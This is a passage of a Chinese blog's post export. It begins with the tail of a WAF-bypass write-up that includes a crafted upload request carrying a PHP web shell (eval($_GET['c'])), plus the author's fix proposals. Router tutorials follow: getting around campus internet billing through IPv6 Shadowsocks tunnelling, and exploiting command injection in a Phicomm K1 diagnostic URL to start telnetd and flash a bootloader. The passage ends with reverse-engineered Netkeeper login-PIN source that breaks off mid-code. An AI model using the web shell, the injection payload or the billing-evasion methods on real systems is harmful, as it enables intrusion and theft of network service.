<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&apos;test3.jpg\nsf/shell.php</span><br><span class="line"></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</span><br></pre></td></tr></table></figure>
<h2 id="4-2-分析其他应用脚本语言"><a href="#4-2-分析其他应用脚本语言" class="headerlink" title="4.2 分析其他应用脚本语言"></a>4.2 分析其他应用脚本语言</h2><p>我们也发现jsp解析也有自己的特点，同时可被用于绕过WAF。暂时未测试asp,aspx,python等常用的WEB应用脚本语言。</p>
<h1 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.     修复方案"></a>5.     修复方案</h1><h2 id="5-1-修复方案一"><a href="#5-1-修复方案一" class="headerlink" title="5.1 修复方案一"></a>5.1 修复方案一</h2><p>解析文件上传请求时，如果发现请求不符合协议规范，则拒绝请求。可能会产生误拦截，需要评估误拦截的影响范围。</p>
<h2 id="5-2-修复方案二"><a href="#5-2-修复方案二" class="headerlink" title="5.2 修复方案二"></a>5.2 修复方案二</h2><p>兼容php的文件解析方式，解析文件名时，以单引号或双引号开头，并且对应的单引号双引号闭合。</p>
<h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.     总结"></a>6.     总结</h1><p>本文通过Review PHP远程dos漏洞(CVE-2015-4024)，并利用该特性绕过现有WAF的文件上传防御，成功上传shell。 更重要的价值，提供给我们一个绕过WAF的新思路，一种研究新方向：利用后端应用脚本与WAF行为的差异绕过WAF的防御。总的来说，一款优秀的WAF应该能够处理兼容WEB应用容器、标准协议、web服务器这间的差异。</p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Openwrt+Shadowsocks+ipv6实现校园网免流量无限时长上网</title>
    <url>/2016/09/24/%E5%9F%BA%E4%BA%8EOpenwrt-Shadowsocks-ipv6%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%85%8D%E6%B5%81%E9%87%8F%E6%97%A0%E9%99%90%E6%97%B6%E9%95%BF%E4%B8%8A%E7%BD%91.html</url>
    <content><![CDATA[<blockquote>
<p>转载自<a href="http://www.jianshu.com/p/4d44172f1a5b" target="_blank" rel="noopener">Dyhube</a></p>
</blockquote>
<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>笔者利用笔记本电脑实现ipv6免费上网已经有一段时间了，原理是通过ipv6访问ipv4资源，在学校网络不限流量、不限时长、20兆带宽（我们学校ipv6限速上下对等20兆，没办法！）,电脑开热点全寝室共用，那真是爽翻天 !</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/ipv6.png" alt="ipv6"></p>
<a id="more"></a>
<p>但是每天回到寝室总是打开电脑开热点还真是蛋疼的事情。再说电脑也不能总是开着吧。这时我就想能不能找个路由器，一天二十四小时开机，电脑、手机、平板随时都可以连。这个想法大概出现在半年前，由于手里没有路由器，就一直没弄，但是网上是有各种成功的案例的。</p>
<p>前段时间手里终于进了台K1，由于之前已经查了相当多的教程，所以就顺风顺水，很快就成功了。下面我就主要讲一下openwrt客户端的配置问题。</p>
<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><p>在大部分高校，ipv4一般是计流量或计时收费的，（笔者学校就是计时收费的，50元200小时网通十兆带宽）而且，由于校园的特殊性，相应的价格也比市面上宽带服务商要高。万幸的是，这些高校一般具有ipv6网络环境，并且由于国家的大力支持，普及范围广，而且不计算流量，聪明的人早就想能不能通过利用ipv6已达到免流量及无限时长上网？答案是可行的，鉴于目前公网的环境普遍是ipv4，我们可以找一台同时具有ipv4和ipv6地址的服务器，我们在校内通过ipv6访问服务器，然后服务器处理我们的访问请求以<code>ipv4/ipv6双栈</code>的方式代替我们访问互联网，再将数据通过ipv6反馈给我们，从而到达免流上网的目的。并且，考虑到大部分高校ipv6没有限制速度，理论上可以达到服务器出口的带宽，当然，具体取决于你们学校的ipv6出口带宽。</p>
<h1 id="为什么用Shadowsocks？"><a href="#为什么用Shadowsocks？" class="headerlink" title="为什么用Shadowsocks？"></a>为什么用Shadowsocks？</h1><p>配置简单，真的简单！以前看到过信息学院的学长写的一篇blog,原理是<code>ipv6 to ipv4</code> 从而ipv6 to ipv4网络,其实原理是一样的，只是他用了<code>openvpn</code>这个软件，但是感觉实现起来好难。像这样的开源支持ipv6协议的软件还是有很多的，这里就不再陈述。</p>
<p>回到原题为什么用Shadowsocks，配置简单。vps服务提供商<a href="https://bandwagonhost.com/" target="_blank" rel="noopener">搬瓦工</a>现在为了迎合国人的需求现在已经预配了Shadowsocks,只需要点击以下安装就ok了。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ab3dea8d36104b08.png" alt="1"></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ab3dea8d36104b08.png" alt="2"></p>
<h1 id="适用对象"><a href="#适用对象" class="headerlink" title="适用对象"></a>适用对象</h1><p>具有<code>ipv6地址</code>、<code>ipv4流量</code>（计时）收费贵爱折腾的大学生。不推荐打国服游戏，延迟你懂的，但对延迟没要求的游戏还是可以玩的，美服、亚服、台服随你玩。</p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="openwrt固件路由器"><a href="#openwrt固件路由器" class="headerlink" title="openwrt固件路由器"></a>openwrt固件路由器</h2><p>路由器的刷机请自行Google,教程一大堆，刷机时笔者也遇到过很多问题，坚持！如果你的也是K1路由器，也要刷机，不妨看这个<a href="http://akkuman.coding.me/2016/09/22/%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">教程</a>。刷机的重点是刷<code>Shadowsocks插件</code>，我的K1直接刷的来自恩山网友的固件，固件里已经附带了Shadowsocks。<a href="http://pan.baidu.com/s/1dFJO4hF" target="_blank" rel="noopener">openwrt</a>固件自取。openwrt控制面板上图。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ed11845c67728119.png" alt="3"></p>
<h2 id="Shadowsocks-ipv6节点信息"><a href="#Shadowsocks-ipv6节点信息" class="headerlink" title="Shadowsocks+ipv6节点信息"></a>Shadowsocks+ipv6节点信息</h2><p>因为笔者手里有台美国的vps，并且配置了Shadowsocks，所以现在拿来就直接用，老实说搭建的Shadowsocks平常很少用，之前觉得租这个vps很是浪费。但是自从寝室里有了这台全天候开机的路由器，值了！在这里我要强调一下，Shadowsocks的节点我们需要ipv6地址的，不然还是没法走校内的ipv6通道。</p>
<h1 id="前方高能预警"><a href="#前方高能预警" class="headerlink" title="前方高能预警"></a>前方高能预警</h1><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>首先openwrt固件路由器登陆<code>192.168.1.1</code>，初始登录默认密码是：<code>admin</code>。登进去之后最好先不要对任何东西改动，按照正常路由器的配置对路由器进行拨号上网。然后选择<code>Shadowsocks插件</code>，选择<code>启动</code>。（为什么这样做呢？笔者尝试了几下，不拨号上网的话，<code>Shadowsocks</code>和<code>DNS</code>配置好了以后无法上网，最后总结，先拨号上网、再配置<code>Shadowsocks</code>和<code>DNS</code>信息）</p>
<p>步骤：点击 <code>openwrt服务</code>&gt;<code>Shadowsocks</code>，出现以下界面。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-8304c61781a62c95.png" alt="4"></p>
<h2 id="Shadowsocks的配置"><a href="#Shadowsocks的配置" class="headerlink" title="Shadowsocks的配置"></a>Shadowsocks的配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器ip：  </span><br><span class="line">密码：  </span><br><span class="line">服务器端口：  </span><br><span class="line">加密方式：</span><br></pre></td></tr></table></figure>
<p>对Shadowsocks配置好了以后，点击下面的透明代理，选择<code>启动</code>。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-b2304b09473a3a76.png" alt="5"></p>
<p>对Shadowsocks配置好以后，我们的任务还没有结束，最重要的就是配置<code>DNS信息</code>。这里如果不配置DNS，IP地址选择ipv4的，Shadowsocks是国外的，那么通过这种方式使用Shadowsocks就是通过路由器来翻fq，在这里我就不多说了。</p>
<h2 id="DNS的配置"><a href="#DNS的配置" class="headerlink" title="DNS的配置"></a>DNS的配置</h2><p>DNS设置有两种方案，一种是利用<code>ChinaDNS</code>，还有一种直接在<code>DHCP/DNS</code>设置页面（<code>网络&gt;DHCP/DNS</code>）进行填写。</p>
<p>由于本次折腾的特殊性，路由器工作在<code>纯ipv6环境</code>下，也就是说路由器没有ipv4的网络，但常用的DNS服务器大多是以ipv4地址方式提供的，如果使用ipv4的DNS服务器就会导致无法解析。此处用了<code>[2001:470:0:c0::2]</code>，但是很不幸，该DNS被污染了，无法解析如google，youtube一类网址，但是对国内的网站的解析很好。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2001:470:0:c0::2</span><br></pre></td></tr></table></figure>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-a819f528346ea980.png" alt="6"></p>
<p>其他的DNS最好选择Google的，相对的来说，网站解析最全面，而且还可以fq,只是一部分了，选择Google的公共DNS有一个缺点，就是像移动端的微信或者qq了，朋友圈的信息或公众号加载不出来，这是很蛋疼的事情。个人还是推荐上面的那条DNS,速度快、国内网站全面，几乎全覆盖。</p>
<p>下面是一些从网上找来的公共DNS，可以试验一下，说不定有什么以外的收获呢。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ordns.he.net  2001:470:20::2     74.82.42.42</span><br><span class="line"></span><br><span class="line">tserv1.fmt2.he.net  2001:470:0:45::2   72.52.104.74</span><br><span class="line"></span><br><span class="line">tserv1.dal1.he.net  2001:470:0:78::2   216.218.224.42</span><br><span class="line"></span><br><span class="line">tserv1.ams1.he.net  2001:470:0:7d::2   216.66.84.46</span><br><span class="line"></span><br><span class="line">tserv1.mia1.he.net  2001:470:0:8c::2   209.51.161.58</span><br><span class="line"></span><br><span class="line">tserv1.tor1.he.net  2001:470:0:c0::2   216.66.38.58</span><br><span class="line"></span><br><span class="line">ns.ipv6.uni-leipzig.de  2001:638:902:1::10   139.18.25.34</span><br></pre></td></tr></table></figure>
<h2 id="Google-Public-DNS"><a href="#Google-Public-DNS" class="headerlink" title="Google Public DNS"></a>Google Public DNS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">google-public-dns-a.google.com  2001:4860:4860::8888   8.8.8.8</span><br><span class="line"></span><br><span class="line">google-public-dns-b.google.com  2001:4860:4860::8844   8.8.4.4</span><br></pre></td></tr></table></figure>
<p>码字不容易，在这里非常感谢<a href="http://www.jianshu.com/p/6559d6e4e7ab" target="_blank" rel="noopener">_Echo</a>和<a href="https://www.zhangzhe.info/2016/03/openwrt-shadowsocks-ipv6/" target="_blank" rel="noopener">张哲</a>两人的post.</p>
<blockquote>
<p>转载自<a href="http://www.jianshu.com/p/4d44172f1a5b" target="_blank" rel="noopener">Dyhube</a></p>
</blockquote>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>life</tag>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenWRT路由器使用ipv6拨号上网教程</title>
    <url>/2016/09/22/Openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BD%BF%E7%94%A8ipv6%E6%8B%A8%E5%8F%B7%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B.html</url>
    <content><![CDATA[<blockquote>
<p>文章来源于群友，如有侵权，请联系我(<a href="mailto:aha971030@gmail.com" target="_blank" rel="noopener">aha971030@gmail.com</a>)删除</p>
</blockquote>
<h1 id="原理介绍分析："><a href="#原理介绍分析：" class="headerlink" title="原理介绍分析："></a>原理介绍分析：</h1><p>湖北E信地区可以使用ipv6拨号，好处是网络是上下对等不限速网络，也就是说，你的端口上限是多少，网上就可以达到多少，我测试很多次，一般在100M左右，但是遗憾的是，该拨号方式只能使用32位系统，且由于E信软件的兼容性问题，很容易导致蓝屏死机。经过大神的抓包分析，该拨号方式是使用ipv6的隧道协议传递ipv4信号。而幸运的是，现在的openwrt支持该协议。也就是说可以使用基于openwrt的路由器采用ipv6拨号。</p>
<h1 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h1><p>首先要明确是，该拨号方式也是需要进行账号换算的，首先启动路由器，并插上网线，在电脑上下载winscp这款软件，然后我们查询一下我们的ip地址，在电脑的dos界面输入ipconfig，找到以太网配置器</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/network111.png" alt="network111"></p>
<a id="more"></a>
<p>默认网关就是路由器的管理ip。</p>
<p>然后我们启动软件，按照图片设置填入数据</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/winscp111.png" alt="winscp111"></p>
<p>然后我们就进入了路由器的文件系统</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-config.png" alt="op-config"></p>
<p>接着，我们要做的是，进入路由器设置里面设置相关端口参数</p>
<p>在电脑的浏览器里输入管理ip地址</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/sk1530.png" alt="sk1530"></p>
<p>进入端口设置界面</p>
<p>首先设置wan口参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-01.png" alt="op-01"></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-02.png" alt="op-02"></p>
<p>切换协议为PPPOE，并随便输入账号密码（具体的拨号的账号密码在后面我们会加以更改）并在高级设置里勾选以下参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-03.png" alt="op-03"></p>
<p>然后保存并应用</p>
<p>然后我们设置lan口参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-04.png" alt="op-04"></p>
<p>按照该图设置</p>
<p>最后，我们回到接口总界面，自己创建一个端口</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-05.png" alt="op-05"></p>
<p>名字无所谓，但协议要选择rfc6333</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-06.png" alt="op-06"></p>
<p>提交以后填写ipv6的地址，经过大神的尝试，下面给的这个地址是比较稳定的，建议使用</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-07.png" alt="op-07"></p>
<p>240e:d:1000::ffff:1:<br>并在高级设置里面勾选默认网关</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-08.png" alt="op-08"></p>
<p>在防火墙设置里，把这个链接拉到wan口里</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-09.png" alt="op-09"></p>
<p>最后保存</p>
<p>这样，路由器上的设置就结束了，下面转入配置文件的修改上</p>
<p>依次顺序进入到如下路径</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-10.png" alt="op-10"></p>
<p>双击network文件打开</p>
<p>并在文件的位置更改</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-11.png" alt="op-11"></p>
<p>然后点击保存</p>
<p>然后进入到此目录，上传我们准备的E信算法库文件</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-12.png" alt="op-12"></p>
<p>最后重启一下路由器，同步一下路由器的时间，就可以了<br>注意，不同的芯片和不同地区的openwrt路由器，sxplugin.so文件是不一样的，具体请查看我上一篇文章打包的东西。</p>
<blockquote>
<p>再说一次，文章来源于群友，如有侵权，请联系我(<a href="mailto:aha971030@gmail.com" target="_blank" rel="noopener">aha971030@gmail.com</a>)删除</p>
</blockquote>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>life</tag>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>给斐讯K1刷机并拨号e信(湖北地区测试无问题)</title>
    <url>/2016/09/22/%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<h1 id="◆购买斐讯k1路由器"><a href="#◆购买斐讯k1路由器" class="headerlink" title="◆购买斐讯k1路由器"></a>◆购买斐讯k1路由器</h1><p>路由器在天猫京东斐讯旗舰店都有售卖，我买的价格是159，不过有一张铃铛卡，一个月之后返还160元，相当于0元购</p>
<h1 id="◆路由器刷不死Breed"><a href="#◆路由器刷不死Breed" class="headerlink" title="◆路由器刷不死Breed"></a>◆路由器刷不死Breed</h1><h2 id="1-路由与电脑有线连接好，输入192-168-2-1，完成设置"><a href="#1-路由与电脑有线连接好，输入192-168-2-1，完成设置" class="headerlink" title="1.路由与电脑有线连接好，输入192.168.2.1，完成设置"></a>1.路由与电脑有线连接好，输入192.168.2.1，完成设置</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/k1basicSetting.png" alt="k1basicSetting"></p>
<h2 id="2-在浏览器地址栏输入：http-192-168-2-1-goform-Diagnosis-pingAddr-192-168-2-100-echo-quot-quot-telnetd"><a href="#2-在浏览器地址栏输入：http-192-168-2-1-goform-Diagnosis-pingAddr-192-168-2-100-echo-quot-quot-telnetd" class="headerlink" title="2.在浏览器地址栏输入：http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd"></a>2.在浏览器地址栏输入：<a href="http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd" target="_blank" rel="noopener">http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd</a></h2><p>(如果你的电脑ip不是192.168.2.100,请改成你电脑的ip(内网ip))</p>
<a id="more"></a>
<h2 id="3-打开tftp，这里用tftp32演示，按图设置"><a href="#3-打开tftp，这里用tftp32演示，按图设置" class="headerlink" title="3.打开tftp，这里用tftp32演示，按图设置"></a>3.打开tftp，这里用tftp32演示，按图设置</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/tftpK1Setting.png" alt="tftpK1Setting"></p>
<h2 id="4-打开CMD-务必使用管理员权限，telnet-192-168-2-1"><a href="#4-打开CMD-务必使用管理员权限，telnet-192-168-2-1" class="headerlink" title="4.打开CMD,务必使用管理员权限，telnet 192.168.2.1"></a>4.打开CMD,务必使用管理员权限，telnet 192.168.2.1</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmdK1Serting.png" alt="cmdK1Serting"></p>
<h2 id="5-输入用户名密码"><a href="#5-输入用户名密码" class="headerlink" title="5.输入用户名密码"></a>5.输入用户名密码</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmd2K1Serting.png" alt="cmd2K1Serting"></p>
<h2 id="6-输入命令"><a href="#6-输入命令" class="headerlink" title="6.输入命令"></a>6.输入命令</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>) <span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>) tftp –g –l /tmp/breed.bin –r breed.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>) cat /dev/mtd1 &gt;/tmp/mtd1.bin</span><br><span class="line">  cat /dev/mtd0 &gt;/tmp/mtd0.bin</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>) tftp –p –r mtd1.bin –l /tmp/mtd1.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></span><br><span class="line">  tftp –p –r mtd1.bin –l /tmp/mtd1.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>) mtd_write write breed.bin Bootloader</span><br></pre></td></tr></table></figure>
<p>等待出现#字<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmd3K1Serting.png" alt="cmd3K1Serting"></p>
<h2 id="7-拔掉电源，然后按住reset键插上电源，地址栏输入192-168-1-1，就进入了breed界面"><a href="#7-拔掉电源，然后按住reset键插上电源，地址栏输入192-168-1-1，就进入了breed界面" class="headerlink" title="7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面"></a>7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breed.png" alt="K1breed"></p>
<h3 id="懒人一键式安装法："><a href="#懒人一键式安装法：" class="headerlink" title="懒人一键式安装法："></a>懒人一键式安装法：</h3><p>输入：<br>wget <a href="http://breed.hackpascal.net/breed-mt7620-reset1.bin" target="_blank" rel="noopener">http://breed.hackpascal.net/breed-mt7620-reset1.bin</a><br>然后输入：<br>mtd_write write breed-mt7620-reset1.bin Bootloader</p>
<p>等待出现#字（代表着已经完成）</p>
<h2 id="刷breed后语"><a href="#刷breed后语" class="headerlink" title="刷breed后语"></a>刷breed后语</h2><p>只要路由breed不被变动，路由刷错固件也不怕，同样方式进入breed刷回正确的即可。</p>
<p>推荐每次刷完固件后，去固件系统管理–恢复原厂默认值。</p>
<h1 id="◆刷openWRT"><a href="#◆刷openWRT" class="headerlink" title="◆刷openWRT"></a>◆刷openWRT</h1><h2 id="1-刷新固件"><a href="#1-刷新固件" class="headerlink" title="1.刷新固件"></a>1.刷新固件</h2><p>我在下面的文件中打包了两个固件，一个是潘多拉的K1专版，一个是openWRT，我自己使用的是专版潘多拉，各位看官自己选择，刷新固件很简单，看图<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breedset1.png" alt="set1"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breedset2.png" alt="set2"></p>
<p>点击更新，看路由灯全部亮起后，无线网络出现,OK</p>
<h1 id="◆安装e信-NetKeeper-插件并进行拨号"><a href="#◆安装e信-NetKeeper-插件并进行拨号" class="headerlink" title="◆安装e信(NetKeeper)插件并进行拨号"></a>◆安装e信(NetKeeper)插件并进行拨号</h1><h2 id="1-你得准备一些东西-WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin-so"><a href="#1-你得准备一些东西-WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin-so" class="headerlink" title="1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin.so"></a>1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为<code>sxplugin.so</code></h2><h2 id="2-通过WINSCP登录你的路由器"><a href="#2-通过WINSCP登录你的路由器" class="headerlink" title="2.通过WINSCP登录你的路由器"></a>2.通过WINSCP登录你的路由器</h2><p><strong> 注意使用scp协议，密码admin（第一次登录op需要重设密码依然设为admin就可以了 </strong></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/winscpK1set.png" alt="winscpK1set"></p>
<h2 id="3-放入拨号插件"><a href="#3-放入拨号插件" class="headerlink" title="3.放入拨号插件"></a>3.放入拨号插件</h2><p>登录之后打开路由器，在这儿选择/(root）然后选择/usr/lib/pppd/2.4.7文件夹将你编辑好的<code>sxplugin.so</code>文件放入即可（<strong> 这里的sxplugin.so是自己更名的，湖北的就选择wuhan的来更名，文件在文末有打包 </strong> ）</p>
<h2 id="4-设置帐号密码拨号"><a href="#4-设置帐号密码拨号" class="headerlink" title="4.设置帐号密码拨号"></a>4.设置帐号密码拨号</h2><p>通过浏览器登录浏览器打开网络下的接口选择WAN口点击修改，协议选择PPPOE即可，然后下面有个按钮点一下会出来填帐号密码的，账户和密码也要写对，我是重庆动态密码可以正常用。（蓝字我是加了中文包的，你刷了过后是英文呢，凑合看吧，加中文包需要路由器联网。）</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/openWRTK1.png" alt="op"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/openWRTK1wan.png" alt="op2"></p>
<p>最后点击保存应用退出</p>
<h2 id="5-最后的配置"><a href="#5-最后的配置" class="headerlink" title="5.最后的配置"></a>5.最后的配置</h2><p>通过WINSCP登录路由器同样打开文件夹/etc/config/找到network修改<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1network.png" alt="K1network"></p>
<p>在图中的位置输入option ‘pppd_options’ ‘plugin sxplugin.so’这个代码即可（注意粘贴后字体是否一致，主要是‘号的问题，可保存后再打开查看，必须搞定字体格式才行），到此netkeeper就安装完了。最后重启路由器，到系统里面选时区，同步浏览器时间，保存。再到wan点击连接就能联网了。（如果进不去wan这个界面就是设置错了）</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/k1lastsetting.png" alt="k1lastsetting"></p>
<blockquote>
<p>最后要说的，这个可用的原因是湖北地区e信2.5的算法依旧可用，有的地区加了心跳，有的地区强制升级了，并不可用,教程到此处完结，后面的有能力可以看看，工具教程打包在文末</p>
</blockquote>
<h1 id="◆闪讯算法源码"><a href="#◆闪讯算法源码" class="headerlink" title="◆闪讯算法源码"></a>◆闪讯算法源码</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pppd/pppd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pppd/md5.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> byte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pppd_version[] = VERSION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> saveuser[MAXNAMELEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> savepwd[MAXSECRETLEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getPIN</span><span class="params">(byte *userName, byte *PIN)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;<span class="comment">//循环变量</span></span><br><span class="line">    <span class="keyword">long</span> timedivbyfive;<span class="comment">//时间除以五</span></span><br><span class="line">    <span class="keyword">time_t</span> timenow;<span class="comment">//当前时间，从time()获得</span></span><br><span class="line">    byte RADIUS[<span class="number">16</span>];<span class="comment">//凑位字符</span></span><br><span class="line">    byte timeByte[<span class="number">4</span>];<span class="comment">//时间 div 5</span></span><br><span class="line">    byte beforeMD5[<span class="number">32</span>];<span class="comment">//时间 div 5+用户名+凑位</span></span><br><span class="line">    MD5_CTX md5;<span class="comment">//MD5结构体</span></span><br><span class="line">    byte afterMD5[<span class="number">16</span>];<span class="comment">//MD5输出</span></span><br><span class="line">    byte MD501H[<span class="number">2</span>]; <span class="comment">//MD5前两位</span></span><br><span class="line">    byte MD501[<span class="number">3</span>];</span><br><span class="line">    byte timeHash[<span class="number">4</span>]; <span class="comment">//时间div5经过第一次转后后的值</span></span><br><span class="line">    byte temp[<span class="number">32</span>]; <span class="comment">//第一次转换时所用的临时数组</span></span><br><span class="line">    byte PIN27[<span class="number">6</span>]; <span class="comment">//PIN的2到7位，由系统时间转换</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">    info(<span class="string">"sxplugin : using zjxinlisx01"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(RADIUS, <span class="string">"zjxinlisx01"</span>);</span><br><span class="line">    timenow = time(<span class="literal">NULL</span>);</span><br><span class="line">    timedivbyfive = timenow / <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        timeByte[i] = (byte)(timedivbyfive &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i)) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        beforeMD5[i]= timeByte[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">4</span>; i &lt; <span class="number">16</span> &amp;&amp; userName[i<span class="number">-4</span>]!=<span class="string">'@'</span> ; i++) &#123;</span><br><span class="line">        beforeMD5[i] = userName[i<span class="number">-4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(RADIUS[j]!=<span class="string">'\0'</span>)</span><br><span class="line">        beforeMD5[i++] = RADIUS[j++];</span><br><span class="line"></span><br><span class="line">    MD5_Init(&amp;md5);</span><br><span class="line">    MD5_Update (&amp;md5, beforeMD5, i);</span><br><span class="line">    